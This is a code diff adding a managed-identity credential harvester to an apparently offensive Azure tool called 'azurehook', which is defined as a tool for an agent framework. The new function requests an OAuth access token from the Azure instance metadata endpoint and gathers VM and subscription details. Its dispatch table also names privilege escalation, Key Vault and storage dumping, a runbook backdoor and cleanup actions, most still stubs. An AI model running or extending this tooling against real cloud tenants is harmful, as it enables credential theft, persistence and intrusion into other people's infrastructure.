@@ -229,6 +229,43 @@ async function storageDump(args: string[], timeout: number): Promise<HookResult>
   return { output: output.join("\n"), findings: [] }
 }
 
+async function managedIdentity(args: string[]): Promise<HookResult> {
+  const resource = argVal(args, "--resource") || "https://management.azure.com/"
+  const output: string[] = ["[*] Probing Azure IMDS for managed identity...\n"]
+
+  try {
+    const resp = await fetch(`http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${encodeURIComponent(resource)}`, {
+      headers: { Metadata: "true" },
+      signal: AbortSignal.timeout(5000),
+    })
+    if (!resp.ok) {
+      output.push(`[-] Token request failed: HTTP ${resp.status}`)
+      return { output: output.join("\n"), findings: [] }
+    }
+    const token = await resp.json()
+    output.push(`[+] Access token obtained for resource: ${resource}`)
+    output.push(`    Token type: ${token.token_type}`)
+    output.push(`    Expires: ${token.expires_on}`)
+    output.push(`    Token: ${String(token.access_token).slice(0, 30)}...`)
+
+    const instance = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {
+      headers: { Metadata: "true" },
+      signal: AbortSignal.timeout(5000),
+    })
+    if (instance.ok) {
+      const meta = await instance.json()
+      output.push(`\n[+] VM: ${meta.compute?.name}`)
+      output.push(`    Location: ${meta.compute?.location}`)
+      output.push(`    ResourceGroup: ${meta.compute?.resourceGroupName}`)
+      output.push(`    Subscription: ${meta.compute?.subscriptionId}`)
+    }
+  } catch {
+    output.push("[-] Cannot reach IMDS endpoint (not on Azure VM/App Service?)")
+  }
+
+  return { output: output.join("\n"), findings: [] }
+}
+
 // ── Tool definition ──
 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
@@ -262,7 +299,7 @@ export const AzurehookTool = Tool.define("azurehook", {
       entra_privesc: () => entraPrivesc(params.args, params.timeout_seconds),
       keyvault_dump: () => keyvaultDump(params.args, params.timeout_seconds),
       storage_dump: () => storageDump(params.args, params.timeout_seconds),
-      managed_identity: () => stub("managed_identity"),
+      managed_identity: () => managedIdentity(params.args),
       runbook_backdoor: () => stub("runbook_backdoor"),
       azuread_token: () => stub("azuread_token"),
       cleanup_azure: () => stub("cleanup_azure"),
